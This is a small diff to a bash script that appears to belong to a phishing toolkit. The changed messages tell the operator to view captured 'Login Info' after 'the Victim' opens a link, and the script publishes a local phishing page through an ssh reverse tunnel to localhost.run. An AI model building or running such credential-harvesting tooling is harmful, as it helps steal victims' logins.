@@ -343,7 +343,7 @@ printf "\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
-printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to view Login Info.Press it After Some Time\e[0m\n"
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
 printf "\e[1;93m\n"
 ssh -R 80:localhost:$port ssh.localhost.run 2>&1
 printf "\e[0m\n"
@@ -370,6 +370,7 @@ printf "\n"
 rm -rf websites/$server/usernames.txt
 fi
 sleep 0.75
+printf "\n\e[96m[\e[0m\e[1;77m~\e[96m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
 
 done
 }
